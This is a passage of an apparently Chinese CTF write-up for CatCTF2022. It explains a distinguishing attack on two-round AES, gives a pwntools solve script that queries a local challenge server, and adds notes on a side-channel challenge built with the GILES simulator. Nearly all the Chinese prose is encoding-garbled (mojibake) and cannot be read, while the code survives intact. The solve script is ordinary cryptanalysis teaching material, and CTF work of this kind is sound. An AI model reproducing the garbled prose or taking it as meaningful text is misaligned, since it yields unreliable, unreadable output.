class="keyword">break</span></span><br><span class="line">            tmpStr += <span class="string">&#x27;&#x27;</span> <span class="comment"># &#x27;\t&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> tmpStr:</span><br><span class="line">        <span class="built_in">print</span>(tmpStr)</span><br></pre></td></tr></table></figure>

<h3 id="can-you-tell-AES-from-blackboxï¼Ÿ"><a href="#can-you-tell-AES-from-blackboxï¼Ÿ" class="headerlink" title="can you tell AES from blackboxï¼Ÿ"></a>can you tell AES from blackboxï¼Ÿ</h3><p>æœ¬é¢˜åŸå§‹å‡ºé¢˜èƒŒæ™¯æ˜¯AESçš„ä¸­é—´ç›¸é‡æ”»å‡»å’Œé™¤äº†ä¼ ç»Ÿå››ç§æ”»å‡»æ¨¡å‹ä¹‹å¤–çš„åŒºåˆ†æ”»å‡»æ¨¡å‹ï¼ŒåŸåˆçš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2bdc710068ef3196000d8b30d162ec8_uPz1CghfKG.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/d2773e673cf6376c245751929a5c245_VM31F-jptu.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/10ca896f2d52bc0bdd192c8ce699324_c74Tfv_E_Q.png" class="">

<p>$C_{11}^{(2)}$åªä¸$t_{11}$åŠä¸€äº›ç”±å¯†é’¥å’Œæ˜æ–‡ä¸­çš„å¸¸æ•°å­—èŠ‚å†³å®šçš„å›ºå®šå€¼æœ‰å…³ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ ç”±a11åˆ°$ C_{11}^{(2)}  $çš„æ˜ å°„è¡¨ï¼Œå¯çŸ¥è¯¥è¡¨åªç”±c1å’Œc5ä¸¤ä¸ªæœªçŸ¥é‡ç¡®å®šï¼Œæ‰€ä»¥æ»¡è¶³æ¡ä»¶çš„æ˜ å°„è¡¨å…±æœ‰2^16ç§ï¼Œè€Œéšæœºæ˜ å°„æ¯æ¬¡æ˜æ–‡çš„æŸä¸ªå­—èŠ‚éƒ½æœ‰2^8ç§æ˜ å°„å¯èƒ½ï¼Œæ‰€ä»¥æä¾›äº†4æ¬¡æœºä¼šï¼Œéšæœºç½®æ¢æ€»å…±çš„å¯èƒ½æ€§åˆ™ä¸º2^32ç§ï¼Œäºæ˜¯å¯çŸ¥ï¼Œéšæœºç½®æ¢è½å…¥AESçš„å¯èƒ½æ€§ä¸º1&#x2F;256ï¼Œå¯èƒ½æ€§è¾ƒå°ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºä¸€ä¸ªåŒºåˆ†æŒ‡æ ‡ã€‚</p>
<p>ä½†æ˜¯ä½œä¸ºä¼ ç»Ÿå¯†ç åˆ†æï¼Œé¢˜ç›®çš„ä¿¡æ¯é‡æ‘†åœ¨è¿™é‡Œï¼Œè§£ä¸æ˜¯å”¯ä¸€çš„ï¼Œåªè¦èƒ½è§£å†³ï¼Œé‚£å°±æ˜¯æ‰¾åˆ°äº†åˆç†çš„ç‰¹å¾ã€‚éšæœºç½®æ¢æ¨¡å‹æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æœ‰å¯èƒ½å¯¼è‡´æŸä¸ªå­—èŠ‚å˜åŒ–åï¼Œå…¶å¯¹åº”å­—èŠ‚çš„å€¼åè€Œæ²¡å˜ï¼Œè€Œæ ¹æ®ä¸Šå¼å¯çŸ¥ï¼Œè¿™ä¸ªæ˜ å°„åº”è¯¥æ˜¯ä¸€ä¸ªå•å°„ï¼Œæ‰€ä»¥å®é™…æˆ‘ä»¬ä½¿ç”¨çš„å…¶å®æ˜¯å¦ä¸€ä¸ªç›¸å…³çš„å¯†ç ç®—æ³•ï¼Œè§„é¿æ‰è¿™ä¸ªåŸºæœ¬çš„éšæœºç‰¹å¾ï¼ˆæ ¹æ®ç”Ÿæ—¥æ”»å‡»ï¼Œè¿™ä¸ªç‰¹å¾åœ¨ç»™å®šæ¨¡å‹æ˜¯a11éå†256æ—¶ï¼Œå¯¹äºåå‘åˆ¤æ–­æ˜¯æ›´è‡´å‘½çš„ï¼‰ã€‚</p>
<p>å› ä¸ºè¿™ä¸ªé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æœ€å¼€å§‹å‡ºé¢˜åœ¨æœ€å¤´éƒ¨åŠ å…¥äº†ä¸€è½®è½®å¯†é’¥åŠ ï¼Œå¹¶è®¾è®¡äº†ç›¸å…³çš„ç®—æ³•æ¥æ¢å¤ï¼Œä½†å› ä¸ºéº»çƒ¦ï¼Œè€Œä¸”æ‰“é€šç‡ä½äºé¢„æœŸï¼ˆå…¶å®åæ¥æ‰¾åˆ°äº†åŸå› ï¼Œä½†é¢˜ç›®å·²ç»æäº¤ä¸Šå»äº†ï¼Œåªèƒ½ä¸‹æ¬¡å†è¯´ï¼‰ï¼Œæ‰€ä»¥æœ€åé¢˜ç›®é™ä½éš¾åº¦ï¼Œæ¢å¤åŸçŠ¶ï¼Œå°†é¦–éƒ¨çš„è½®å¯†é’¥åŠ å»æ‰ï¼Œå³åªæ˜¯å°†éå†ä¸‹é™åˆ°4æ¬¡æœºä¼šï¼Œè¿™å°±å¯¼è‡´äº†ä»a11åˆ°t11çš„è¿‡ç¨‹æ˜¯æ•Œæ‰‹å¯æ§çš„ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘èƒ½æ§åˆ¶tï¼Œå°±ä¼šå‘ç°å½“tåªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚å˜åŒ–æ—¶ï¼Œåªä¼šåœ¨æœ€åä¸€æ¬¡åˆ—æ··åˆé€ æˆæ‰©æ•£ï¼Œå‰é¢çš„12å­—èŠ‚éƒ½æ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆè¿™ä¹Ÿæ˜¯ä¸ªå¯è¡Œçš„åŒºåˆ†ç‰¹å¾ï¼Œä½†æ³›åŒ–æ€§ä¸å¦‚åŸæ€è·¯ï¼Œåœ¨å¤´éƒ¨åŠ å…¥è½®å¯†é’¥çš„æ—¶å€™å°±ä¼šå¤±æ•ˆã€‚</p>
<p>æ­¤å¤–è¿˜æœ‰å¸ˆå‚…åœ¨ä¸Šé¢çš„æ€è·¯ä¹‹å¤–åˆ©ç”¨å·®åˆ†å°†ç¬¬äºŒè½®çš„å¯†é’¥å½±å“æ¶ˆé™¤æ‰ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¸¸è§çš„trickï¼Œå¯ä»¥æŠŠä¸Šé¢çš„2^16çš„è¡¨è¿›ä¸€æ­¥ä¸‹é™åˆ°2^8çš„æ°´å¹³ã€‚ä½†è¿™ä½å¸ˆå‚…æ˜¯åœ¨åŒºåˆ†æ”»å‡»ä¹‹å¤–æ›´è¿›ä¸€æ­¥ï¼Œåšèµ·äº†å¯†é’¥æ¢å¤ï¼Œè¿™äºŒè€…è™½ç„¶å¯†ä¸å¯åˆ†ï¼Œä½†å¯¹äºåŒºåˆ†æ”»å‡»è€Œè¨€å¢åŠ äº†å·¥ä½œé‡ã€‚</p>
<p>æˆ‘çš„è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line">addRoundKey=<span class="keyword">lambda</span> inp,key: xor(inp.rjust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>),long_to_bytes(key).rjust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))</span><br><span class="line">subBytes=<span class="keyword">lambda</span> x,S:<span class="built_in">bytes</span>([S[i] <span class="keyword">for</span> i <span class="keyword">in</span> x])</span><br><span class="line">shiftRow=<span class="keyword">lambda</span> S:[\</span><br><span class="line">        S[<span class="number">0</span>],S[<span class="number">4</span>],S[<span class="number">8</span>],S[<span class="number">12</span>],\</span><br><span class="line">        S[<span class="number">5</span>],S[<span class="number">9</span>],S[<span class="number">13</span>],S[<span class="number">1</span>],\</span><br><span class="line">        S[<span class="number">10</span>],S[<span class="number">14</span>],S[<span class="number">2</span>],S[<span class="number">6</span>],\</span><br><span class="line">        S[<span class="number">15</span>],S[<span class="number">3</span>],S[<span class="number">7</span>],S[<span class="number">11</span>]\</span><br><span class="line">        ]</span><br><span class="line">mul2=<span class="keyword">lambda</span> x:(x&lt;&lt;<span class="number">1</span>)^<span class="number">0b100011011</span> <span class="keyword">if</span> x&amp;<span class="number">0x80</span> <span class="keyword">else</span> x&lt;&lt;<span class="number">1</span></span><br><span class="line">mul3=<span class="keyword">lambda</span> x:x^mul2(x)</span><br><span class="line"></span><br><span class="line">mixColomn=<span class="keyword">lambda</span> S:<span class="built_in">bytes</span>(<span class="built_in">sum</span>([[</span><br><span class="line">                       mul2(S[i])^mul3(S[i+<span class="number">1</span>])^S[i+<span class="number">2</span>]^S[i+<span class="number">3</span>],</span><br><span class="line">                       S[i]^mul2(S[i+<span class="number">1</span>])^mul3(S[i+<span class="number">2</span>])^S[i+<span class="number">3</span>],</span><br><span class="line">                       S[i]^S[i+<span class="number">1</span>]^mul2(S[i+<span class="number">2</span>])^mul3(S[i+<span class="number">3</span>]),</span><br><span class="line">                       mul3(S[i])^S[i+<span class="number">1</span>]^S[i+<span class="number">2</span>]^mul2(S[i+<span class="number">3</span>])</span><br><span class="line">                       ] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>)],[]))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_2r</span>(<span class="params">inp,key,S</span>):</span><br><span class="line">        <span class="comment">#c=addRoundKey(inp,key[0])</span></span><br><span class="line">        c=subBytes(inp,S)</span><br><span class="line">        c=shiftRow(c)</span><br><span class="line">        c=mixColomn(c)</span><br><span class="line">        c=addRoundKey(c,key[<span class="number">0</span>])</span><br><span class="line">        c=subBytes(c,S)</span><br><span class="line">        c=shiftRow(c)</span><br><span class="line">        c=mixColomn(c)</span><br><span class="line">        c=addRoundKey(c,key[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">S_BOX = [</span><br><span class="line">             <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">             <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">             <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">             <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">             <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">             <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">             <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">             <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">             <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">             <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">             <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">             <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">             <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">             <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    dic[i]=[mul2(S_BOX[mul2(S_BOX[<span class="number">0</span>])^i])]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        dic[i].append(mul2(S_BOX[mul2(S_BOX[c])^i])^dic[i][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    c=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    t=(((<span class="built_in">bytes</span>([<span class="number">0</span>])+c[<span class="number">1</span>:<span class="number">16</span>]).ljust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))[:<span class="number">16</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(t)</span><br><span class="line">    a=<span class="built_in">int</span>(p.recvline()[<span class="number">6</span>:],<span class="number">16</span>)</span><br><span class="line">    ans=[a&gt;&gt;<span class="number">120</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        t=<span class="built_in">hex</span>(((<span class="built_in">bytes</span>([j])+c[<span class="number">1</span>:<span class="number">16</span>]).ljust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))[:<span class="number">16</span>])[<span class="number">2</span>:]</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.sendline(t)</span><br><span class="line">        a=<span class="built_in">int</span>(p.recvline()[<span class="number">6</span>:],<span class="number">16</span>)</span><br><span class="line">        ans.append((a&gt;&gt;<span class="number">120</span>)^ans[<span class="number">0</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>:<span class="number">4</span>]==dic[k][<span class="number">1</span>:<span class="number">4</span>]:</span><br><span class="line">            p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">    p.recvline()    </span><br><span class="line">    <span class="built_in">print</span>(i)    </span><br><span class="line">p.interactive()    </span><br></pre></td></tr></table></figure>

<p>å› ä¸ºå‡ºé¢˜çš„æ—¶å€™å°±è¯„ä¼°åˆ°äº†ï¼Œæœ¬é¢˜æ‰€æä¾›çš„ä¿¡æ¯é‡å°±é‚£äº›ï¼Œæ”¶ä¸Šæ¥çš„wpè¿™å‡ ç§åšæ³•è™½ç„¶æœ‰å˜æ¢å­—èŠ‚çš„ä½ç½®å’Œå˜æ¢å­—èŠ‚çš„ç¯èŠ‚ä¸åŒï¼Œç”šè‡³æœ€åç¡®å®šçš„ç‰¹å¾æœ‰åŒºåˆ«ï¼Œä½†éƒ½æ˜¯ä¸‹æ”¾åˆ°äº†åˆé€‚çš„æ•°æ®å¤æ‚åº¦ï¼Œæ‰€ä»¥åªè¦æ˜¯æ„é€ åˆ°å…·ä½“å­—èŠ‚ä»è€Œé™ä½å¤æ‚åº¦è¿›è¡Œæ”»å‡»çš„æ–¹æ¡ˆéƒ½æ˜¯é¢„æœŸçš„ã€‚å¦‚æœæ˜¯å¤ç°ï¼Œè¿˜è¯·å„ä½å¸ˆå‚…å¤§èƒ†å°è¯•ä¸åŒçš„ä½ç½®ï¼Œå¸Œæœ›èƒ½å¸®åˆ°å„ä½åœ¨ä¼ ç»Ÿå¯¹ç§°å¯†ç ç®—æ³•åˆ†æçš„æƒ…æ™¯ä¸‹æ‰¾åˆ°æ–°çš„å…´è¶£ç‚¹ã€‚</p>
<h3 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h3><p>è®ºæ–‡æ˜¯ä»Šå¹´çš„<a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/document/9702284" title="Single-Trace Side-Channel Attacks on Ï‰-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM">Single-Trace Side-Channel Attacks on Ï‰-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM</a>ï¼Œä¸»è¦æ˜¯åˆ†æåœ¨ç®—æ³•é«˜æ–¯é‡‡æ ·é¢„å¤„ç†çš„è¿‡ç¨‹ä¸­å¯¹ä¸‰å…ƒå¤šé¡¹å¼çš„ç›´æ¥æ”»å‡»ï¼Œé™¤æ­¤ä¹‹å¤–åœ¨2018å¹´çš„å¦ä¸€ç¯‡è®ºæ–‡ä¸­ä¹Ÿæ¢è®¨äº†åœ¨æ­ç§˜ç¯èŠ‚ç›´æ¥æ”»å‡»ä¸‰å…ƒå¤šé¡¹å¼çš„ä¸€äº›æ–¹æ¡ˆï¼Œä½†å› ä¸ºæ—¶é—´è¾ƒä¸ºä¹…è¿œï¼Œå¯¹åº”çš„ä»£ç ä»“åº“æ²¡æœ‰äº†ï¼ŒçŒœæµ‹æ˜¯é‚£ç§å®ç°æœ€ç»ˆè¢«NTRUå®˜æ–¹banäº†ï¼Œæ‰€ä»¥æœ€åæ”¹æ¢äº†è¿™ç¯‡ã€‚</p>
<p>ä½¿ç”¨çš„ä»¿çœŸå·¥å…·æ˜¯<a target="_blank" rel="noopener" href="https://github.com/sca-research/GILES" title="GitHub - sca-research/GILES">GitHub - sca-research&#x2F;GILES</a>ï¼Œç›¸æ¯”äºELMOä¼¼ä¹æ›´å¥½ä¸Šæ‰‹äº›ï¼ˆä»–æœ¬èº«åŸæ¥å°±å«ELMO2ï¼‰ï¼Œä½†æ˜¯æ²¡æœ‰åˆé€‚çš„å‡ºé¢˜æ ·ä¾‹äº†ï¼Œæ‰€ä»¥å€Ÿè¿™æ¬¡å†™ä¸ªå®Œæ•´çš„å·¥å…·ä½¿ç”¨æ–‡æ¡£ã€‚</p>
<p>GILESå¤„ç†çš„æ˜¯å¯ä»¥ç›´æ¥ç§»æ¤åˆ°arm cortex M0æœºå™¨ä¸Šçš„æŒ‡ä»¤ï¼Œä½†åŒæ—¶å› ä¸ºä»–æœ‰ä»¿çœŸæ‰€ç”¨çš„éƒ¨åˆ†å‡½æ•°ï¼Œä¹Ÿä¸èƒ½ç›´æ¥äº¤å‰ç¼–è¯‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://github.com/sca-research/thumb-sim" title="GitHub - sca-research/thumb-sim: Thumb Timing Simulator">GitHub - sca-research&#x2F;thumb-sim: Thumb Timing Simulator</a>æ¥ç”Ÿæˆç¼–è¯‘æ–‡ä»¶ã€‚ä»¿çœŸå™¨çš„å‡½æ•°å¤´ä½¿ç”¨çš„æ˜¯<a target="_blank" rel="noopener" href="https://github.com/sca-research/GILES/releases/download/1.1.0/elmo-funcs.h" title="elmo-funcs.h download">elmo-funcs.h download</a>ï¼Œä¸»è¦åŒ…æ‹¬è§¦å‘å™¨ç›¸å…³çš„åŠŸèƒ½å’Œè¯»å†™å­—èŠ‚ç›¸å…³çš„åŠŸèƒ½ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å­—èŠ‚è¯»å†™ä¼¼ä¹éœ€è¦å¯¹é½åˆ°æŸä¸ªå€¼ï¼Œä¸ç„¶æ— æ³•è¯»å–ã€‚</p>
<p>åœ¨åˆ©ç”¨GILESç”Ÿæˆæ•°æ®çš„æ—¶å€™ï¼Œæœ‰ç”µæºæ¨¡å¼å’Œæ±‰æ˜é‡ä¸¤ç§é¢„è®¾æ¨¡å¼ï¼Œä½†å®é™…ä½“éªŒä¸‹æ¥ç”µæºæ¨¡å¼çš„æ•°æ®ç”Ÿæˆæ„Ÿè§‰æ¯”è¾ƒè‰ç‡ï¼Œä¸å¦‚ELMOçš„æ•°æ®çœ‹èµ·æ¥çœŸå®ï¼Œæ‰€ä»¥æˆ‘å‡ºé¢˜ä¸€èˆ¬æ˜¯ä½¿ç”¨hwæ¨¡å¼ã€‚btwä»–ä¹Ÿæä¾›æ¨¡å¼çš„è‡ªå®šä¹‰ï¼Œæƒ³ç€å¦‚æœæœ‰æœºä¼šèƒ½ä¸èƒ½æœç½—ä¸€ä¸‹å…¶ä»–çš„æ¨¡å¼åƒæ˜¯æ±‰æ˜è·å•¥çš„ï¼Œç„¶ååšä¸‹å¼€æºå¼€å‘è€…è¿™æ ·ã€‚</p>
<p>äº§ç”Ÿçš„æ•°æ®æ˜¯trsæ ¼å¼ï¼Œç”¨pythonçš„trsfileåº“å¯ä»¥è¯»å–ï¼Œä¸»è¦åŒ…æ‹¬æ•°æ®çš„é‡‡é›†è½¨è¿¹å’Œå¯¹åº”çš„æ³¨é‡Šæ•°æ®ï¼Œæ•´ä½“ç»“æ„è¿˜å¾ˆæ¸…æ™°ã€‚</p>
